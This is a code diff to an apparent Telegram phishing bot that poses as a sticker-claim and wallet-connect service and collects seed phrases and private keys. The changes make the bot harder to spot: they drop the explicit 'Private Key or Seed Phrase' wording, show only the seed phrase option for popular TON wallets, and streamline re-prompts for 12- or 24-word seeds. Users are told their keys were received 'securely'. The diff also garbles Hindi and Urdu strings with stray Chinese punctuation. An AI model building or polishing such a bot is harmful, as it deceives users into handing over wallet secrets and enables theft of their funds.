@@ -172,7 +172,8 @@ LANGUAGES = {
         "high gas fees": "High Gas Fees",
         "presale issues": "Presale Issues",
         "claim missing sticker": "Claim Missing Sticker",
-        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
+        # changed to match requested phrasing when connecting from sticker flow
+        "connect wallet message": "please connect your wallet to claim the stickers you entered",
         "connect wallet button": "🔑 Connect Wallet",
         "select wallet type": "Please select your wallet type:",
         "other wallets": "Other Wallets",
@@ -185,7 +186,8 @@ LANGUAGES = {
         "invalid choice": "Invalid choice. Please use the buttons.",
         "final error message": "‼️ An error occurred. Use /start to try again.",
         "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
-        "error_use_seed_phrase": "We detected what looks like an address. This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
+        # simplified message as requested (removed detection sentence) and will be used as the single prompt with ForceReply
+        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
         "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
         "choose language": "Please select your preferred language:",
         "await restart message": "Please click /start to start over.",
@@ -667,8 +669,8 @@ LANGUAGES = {
         "prompt seed": "कृपया BOINKERS उपयोगकर्ता नाम और 12/24 शब्द दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
         "prompt private key": "कृपया निजी कुंजी दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
         "invalid choice": "अमान्य विकल्प। बटन उपयोग करें।",
-        "final error message": "‼️ त्रुटि हुई。 /start से पुनः प्रयास करें。",
-        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और प्रोसेस की जाएगी। /start से पुनः शुरू करें。",
+        "final error message": "‼️ त्रुटि हुई。 /start से पुनः प्रयास करें।",
+        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षा से प्राप्त कर ली गई है और प्रोसेस की जाएगी। /start से पुनः शुरू करें。",
         "error_use_seed_phrase": "ऐसा लगा कि आपने पता दिया। कृपया seed phrase (12 या 24 शब्द) दें।",
         "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। कृपया पुनः प्रयास के लिए /start करें।",
         "choose language": "कृपया भाषा चुनें:",
@@ -838,20 +840,20 @@ LANGUAGES = {
         "other wallets": "دیگر والٹس",
         "private key": "🔑 نجی کلید",
         "seed phrase": "🔒 سیڈ فریز درآمد کریں",
-        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے۔\nکنکشن موڈ منتخب کریں۔",
+        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nکنکشن موڈ منتخب کریں。",
         "reassurance": PROFESSIONAL_REASSURANCE["ur"],
         "prompt seed": "براہ کرم BOINKERS یوزر اور 12/24 الفاظ داخل کریں." + PROFESSIONAL_REASSURANCE["ur"],
         "prompt private key": "براہ کرم نجی کلید داخل کریں." + PROFESSIONAL_REASSURANCE["ur"],
-        "invalid choice": "غلط انتخاب۔ بٹن استعمال کریں۔",
-        "final error message": "‼️ ایک خرابی پیش آئی۔ /start سے دوبارہ کوشش کریں۔",
-        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں۔",
+        "invalid choice": "غلط انتخاب۔ بٹن استعمال کریں。",
+        "final error message": "‼️ ایک خرابی پیش آئی۔ /start سے دوبارہ کوشش کریں。",
+        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں。",
         "error_use_seed_phrase": "یہ فیلڈ seed فریز (12 یا 24 الفاظ) مانگتا ہے۔ براہ کرم seed درج کریں۔",
-        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید داخل کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی اور پیسٹ استعمال کریں۔ براہ کرم دوبارہ کوشش کے لیے /start کریں۔",
+        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید داخل کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی اور پیسٹ استعمال کریں۔ براہ کرم دوبارہ کوشش کے لیے /start کریں。",
         "choose language": "براہ کرم زبان منتخب کریں:",
         "await restart message": "براہ کرم /start دبائیں۔",
         "enter stickers prompt": "براہ کرم وہ اسٹیکر لکھیں جو آپ کلیم کرنا چاہتے ہیں۔",
         "confirm claim stickers": "کیا آپ یقین رکھتے ہیں کہ آپ یہ اسٹیکرز کلیم کرنا چاہتے ہیں؟",
-        "confirm_entered_stickers": "آپ نے {count} اسٹیکر درج کیے ہیں:\n{stickers}\n\nپوشید کریں۔",
+        "confirm_entered_stickers": "آپ نے {count} اسٹیکر درج کیے ہیں:\n{stickers}\n\nپوشید کریں。",
         "yes": "ہاں",
         "no": "نہیں",
         "back": "🔙 واپس",
@@ -1539,6 +1541,7 @@ async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 
 # Show private key / seed options (forward navigation -> send new message). Wallet name localized.
+# Only show the seed phrase option for the specific wallets requested (tonkeeper, tonhub, telegram wallet, mytonwallet)
 async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
@@ -1547,12 +1550,31 @@ async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE
     wallet_name = BASE_WALLET_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
     localized_wallet_name = localize_wallet_label(wallet_name, lang)
     context.user_data["wallet type"] = localized_wallet_name
-    keyboard = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
-            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
-        ]
-    )
+
+    # Wallet keys for which we only present the seed phrase option
+    seed_only_wallet_keys = {
+        "wallet_type_metamask",    # mapped to Tonkeeper in BASE_WALLET_NAMES
+        "wallet_type_tonkeeper",   # mapped to Tonhub
+        "wallet_type_trust_wallet",# Telegram Wallet
+        "wallet_type_coinbase",    # MyTon Wallet
+        "wallet_type_mytonwallet", # MyTon (alternate key in other list)
+    }
+
+    if wallet_key in seed_only_wallet_keys:
+        keyboard = InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
+                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
+            ]
+        )
+    else:
+        keyboard = InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
+                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
+            ]
+        )
+
     text = ui_text(context, "wallet selection message").format(wallet_name=localized_wallet_name)
     context.user_data["current_state"] = PROMPT_FOR_INPUT
     await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
@@ -1604,10 +1626,9 @@ async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     # If user did NOT provide 12 or 24 words: guide them to provide the seed (localized), ask again with ForceReply.
     if len(words) not in (12, 24):
-        # Send guidance message and re-prompt for seed phrase
-        await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, state=RECEIVE_INPUT)
+        # Send a single guidance message that also attaches ForceReply so the user is prompted only once.
         fr = ForceReply(selective=False)
-        await send_and_push_message(context.bot, chat_id, ui_text(context, "prompt seed"), context, reply_markup=fr, state=RECEIVE_INPUT)
+        await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
         context.user_data["current_state"] = RECEIVE_INPUT
         return RECEIVE_INPUT
 
